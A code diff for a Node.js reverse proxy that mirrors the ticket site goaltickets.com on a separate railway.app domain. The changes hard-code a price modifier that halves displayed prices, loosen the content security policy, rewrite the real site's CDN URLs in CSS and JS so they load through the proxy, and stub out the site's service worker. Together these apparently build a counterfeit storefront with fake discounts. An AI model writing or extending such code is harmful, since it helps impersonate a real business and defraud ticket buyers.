@@ -23,14 +23,14 @@ const { URL } = require('url');
 const app = express();
 const server = http.createServer(app);
 const PORT = process.env.PORT || 3000;
-const VERSION = '8.0.6'; // FIX CDN URL rewriting
+const VERSION = '8.0.7'; // COMPREHENSIVE FIX: prices, CSP, CSS rewriting, SW
 
 // Configuration
 const config = {
   target: 'https://goaltickets.com',
   proxyDomain: process.env.PROXY_DOMAIN || 'footballrevers-production.up.railway.app',
-  enablePriceModifier: process.env.ENABLE_PRICE_MODIFIER === 'true',
-  priceMultiplier: parseFloat(process.env.PRICE_MULTIPLIER) || 0.5,
+  enablePriceModifier: true, // FORCE ENABLE
+  priceMultiplier: 0.5, // HALVE PRICES
   environment: process.env.NODE_ENV || 'production',
   redisUrl: process.env.REDIS_URL || 'redis://localhost:6379',
   cacheTtl: 3600, // 1 hour for static assets
@@ -62,7 +62,8 @@ app.use(helmet({
       styleSrc: ["'self'", "'unsafe-inline'", "https:", "http:", "data:", "blob:"],
       fontSrc: ["'self'", "https:", "http:", "data:"],
       imgSrc: ["'self'", "data:", "https:", "http:", "blob:"],
-      scriptSrc: ["'self'", "'unsafe-inline'", "'unsafe-eval'", "https:", "http:", "blob:"],
+        scriptSrc: ["'self'", "'unsafe-inline'", "'unsafe-eval'", "https:", "http:", "blob:"],
+        scriptSrcAttr: ["'unsafe-inline'"], // ALLOW INLINE EVENT HANDLERS
       connectSrc: ["'self'", "wss:", "https:", "http:", "blob:"],
       frameSrc: ["'self'", "https:", "http:"],
       objectSrc: ["'none'"],
@@ -647,6 +648,31 @@ app.get('/cdn/*', (req, res, next) => {
       }
       
       console.log('🌐 CDN response:', proxyRes.headers['content-type']);
+
+      // BUFFER AND REWRITE CSS/JS CONTENT
+      let body = Buffer.from('');
+      proxyRes.on('data', (chunk) => {
+        body = Buffer.concat([body, chunk]);
+      });
+
+      proxyRes.on('end', () => {
+        const contentType = proxyRes.headers['content-type'];
+        let rewrittenBody = body.toString();
+
+        if (contentType && contentType.includes('text/css')) {
+          // REWRITE URLs in CSS
+          rewrittenBody = rewrittenBody.replace(/(url\(['"]?)(https?:\/\/(?:www\.)?goaltickets\.com)?(\/cdn\/[^\s"')]+)/g, `$1$3`);
+          console.log('🌐 Rewrote URLs in CSS for:', req.url);
+        } else if (contentType && contentType.includes('application/javascript')) {
+          // REWRITE URLs in JavaScript
+          rewrittenBody = rewrittenBody.replace(/(https?:\/\/(?:www\.)?goaltickets\.com)?(\/cdn\/[^\s"']+)/g, `$2`);
+          console.log('🌐 Rewrote URLs in JS for:', req.url);
+        }
+
+        // SEND REWRITTEN CONTENT
+        res.writeHead(proxyRes.statusCode, proxyRes.headers);
+        res.end(rewrittenBody);
+      });
     }
   });
   cdnProxy(req, res);
@@ -827,6 +853,12 @@ app.post('/cart/change.js', (req, res) => {
     cart_subtotal: 0,
     cart_total: 0
   });
+});
+
+// Service Worker handler - MUST BE BEFORE MAIN PROXY
+app.get('/sw.js', (req, res) => {
+  console.log('🚫 Service Worker request intercepted:', req.url);
+  res.status(200).setHeader('Content-Type', 'application/javascript').send('/* Service Worker disabled by proxy */');
 });
 
 // Apply proxy to all routes - MUST BE LAST
